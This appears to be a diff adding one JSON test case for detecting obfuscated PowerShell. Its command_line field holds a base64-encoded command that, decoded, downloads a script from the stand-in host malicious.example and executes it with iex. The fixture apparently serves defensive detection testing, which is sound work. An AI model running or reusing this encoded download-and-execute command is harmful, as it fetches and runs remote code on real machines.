@@ -1,0 +1,10 @@
+{
+  "id": "ps-encoded-0",
+  "category": "ps-encoded",
+  "command_line": "powershell.exe -NoProfile -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AeAAuAHAAcwAxACcAKQA=",
+  "expected_keywords": [
+    "malicious.example"
+  ],
+  "source": "nivxray-rc40-obfuscation",
+  "license": "CC-BY-4.0"
+}
